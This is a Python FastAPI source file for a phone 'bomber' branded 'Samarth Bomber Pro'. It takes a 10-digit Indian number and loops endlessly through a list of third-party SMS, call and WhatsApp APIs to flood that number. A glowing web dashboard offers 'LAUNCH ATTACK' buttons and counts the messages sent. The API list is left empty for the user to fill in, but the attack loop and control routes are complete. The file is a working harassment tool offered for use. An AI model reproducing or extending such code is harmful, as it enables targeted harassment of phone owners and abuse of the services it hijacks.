from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

ULTIMATE_APIS = [
    # Paste ALL your APIs here
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} → {msg}")
    if len(attack_status["logs"]) > 25: attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except: pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log("ATTACK INITIALIZED")
    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"Cycle {attack_status['cycles']} | APIs Fired")
            await asyncio.sleep(2)
    add_log("ATTACK TERMINATED")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samarth Bomber • Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
        body { background: #05080f; font-family: 'Inter', sans-serif; }
        .title { font-family: 'Space Grotesk', sans-serif; }
        .neon { text-shadow: 0 0 15px #22d3ee, 0 0 30px #22d3ee, 0 0 50px #67e8f9; }
        .glass { background: rgba(10, 15, 35, 0.92); backdrop-filter: blur(20px); border: 1px solid rgba(103, 232, 249, 0.25); }
        .glow-btn { transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .glow-btn:hover { box-shadow: 0 0 35px #22d3ee, 0 0 70px #67e8f9; transform: scale(1.03); }
        .log-line { animation: fadeIn 0.4s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="text-slate-200 min-h-screen">
    <div class="max-w-md mx-auto px-4 py-8">
        <!-- Top Bar -->
        <div class="flex items-center justify-between mb-10">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-cyan-500 rounded-2xl flex items-center justify-center text-2xl shadow-[0_0_25px_#22d3ee]">⚡</div>
                <div>
                    <h1 class="title text-4xl font-bold tracking-tighter neon text-white">SAMARTH</h1>
                    <p class="text-cyan-400 text-xs tracking-[3px] -mt-1">BOMBER PRO</p>
                </div>
            </div>
            <div id="status" class="text-xs font-mono px-5 py-2 bg-emerald-900/30 border border-emerald-500/50 rounded-full text-emerald-400">SYSTEM ONLINE</div>
        </div>

        <div class="glass rounded-3xl p-8 shadow-2xl shadow-cyan-500/10">
            <div class="text-center mb-8">
                <div class="inline-flex items-center gap-2 bg-cyan-950 text-cyan-300 text-sm px-6 py-2 rounded-3xl border border-cyan-400/30">
                    <div class="w-2 h-2 bg-cyan-400 rounded-full animate-pulse"></div>
                    TARGET ACQUIRED
                </div>
            </div>

            <input id="phone" maxlength="10" 
                   class="w-full bg-zinc-950 border border-cyan-500/40 focus:border-cyan-400 rounded-2xl px-8 py-7 text-4xl font-mono text-center tracking-widest outline-none transition-all" 
                   placeholder="98XXXXXXXX" type="tel">

            <div class="mt-10 grid grid-cols-2 gap-4">
                <button onclick="startAttack()" id="startBtn"
                        class="glow-btn bg-gradient-to-r from-cyan-500 to-blue-600 py-7 rounded-2xl text-xl font-semibold shadow-xl flex items-center justify-center gap-3">
                    <span>LAUNCH ATTACK</span> 🚀
                </button>
                <button onclick="stopAttack()" id="stopBtn" class="hidden glow-btn bg-red-600/90 hover:bg-red-600 py-7 rounded-2xl text-xl font-semibold">
                    TERMINATE
                </button>
            </div>
        </div>

        <!-- Stats -->
        <div class="glass rounded-3xl p-8 mt-6">
            <h3 class="text-cyan-400 text-xs tracking-widest mb-6 text-center">ATTACK METRICS</h3>
            <div class="grid grid-cols-3 gap-4">
                <div class="text-center">
                    <div id="calls" class="text-5xl font-bold text-orange-400">0</div>
                    <div class="text-[10px] text-slate-400 mt-1">CALLS</div>
                </div>
                <div class="text-center">
                    <div id="sms" class="text-5xl font-bold text-sky-400">0</div>
                    <div class="text-[10px] text-slate-400 mt-1">SMS</div>
                </div>
                <div class="text-center">
                    <div id="wa" class="text-5xl font-bold text-emerald-400">0</div>
                    <div class="text-[10px] text-slate-400 mt-1">WHATSAPP</div>
                </div>
            </div>
            <div class="mt-8">
                <div class="flex justify-between text-xs mb-3">
                    <span class="text-slate-400">CYCLES COMPLETED</span>
                    <span id="cycles" class="font-mono text-cyan-300">0</span>
                </div>
                <div class="h-1.5 bg-zinc-900 rounded-full">
                    <div id="progress" class="h-1.5 bg-gradient-to-r from-cyan-400 via-blue-400 to-sky-400 rounded-full w-0 transition-all duration-700"></div>
                </div>
            </div>
        </div>

        <!-- Logs -->
        <div class="glass rounded-3xl p-8 mt-6">
            <div class="flex items-center justify-between mb-5">
                <h3 class="text-cyan-400 text-xs tracking-widest">LIVE CONSOLE</h3>
                <div class="text-[10px] text-slate-500">REAL-TIME</div>
            </div>
            <div id="logs" class="font-mono text-xs h-64 overflow-y-auto bg-black/60 p-5 rounded-2xl text-slate-300 space-y-2"></div>
        </div>

        <div class="text-center text-[10px] text-slate-600 mt-10">© SAMARTH • PRO EDITION</div>
    </div>

    <script>
        let isRunning = false;
        async function startAttack() {
            const phone = document.getElementById("phone").value.trim();
            if (phone.length !== 10) return alert("Enter valid 10-digit number");
            const res = await fetch("/start", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone})});
            if ((await res.json()).status === "success") {
                isRunning = true;
                document.getElementById("startBtn").classList.add("hidden");
                document.getElementById("stopBtn").classList.remove("hidden");
                document.getElementById("status").innerHTML = `ATTACKING +91${phone} <span class="animate-pulse">●</span>`;
                pollStatus();
            }
        }
        async function stopAttack() {
            await fetch("/stop", {method:"POST"});
            isRunning = false;
            document.getElementById("startBtn").classList.remove("hidden");
            document.getElementById("stopBtn").classList.add("hidden");
            document.getElementById("status").textContent = "SYSTEM ONLINE";
        }
        function pollStatus() {
            if (!isRunning) return;
            fetch("/status").then(r => r.json()).then(d => {
                document.getElementById("calls").textContent = d.stats.Call || 0;
                document.getElementById("sms").textContent = d.stats.SMS || 0;
                document.getElementById("wa").textContent = d.stats.WhatsApp || 0;
                document.getElementById("cycles").textContent = d.cycles;
                document.getElementById("progress").style.width = Math.min(d.cycles * 8 % 100 + 30, 100) + "%";
                
                const logsDiv = document.getElementById("logs");
                logsDiv.innerHTML = d.logs.map(l => `<div class="log-line">${l}</div>`).join('');
                logsDiv.scrollTop = logsDiv.scrollHeight;
                setTimeout(pollStatus, 1300);
            });
        }
    </script>
</body>
</html>
    """
    return html

# Routes same as before
@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
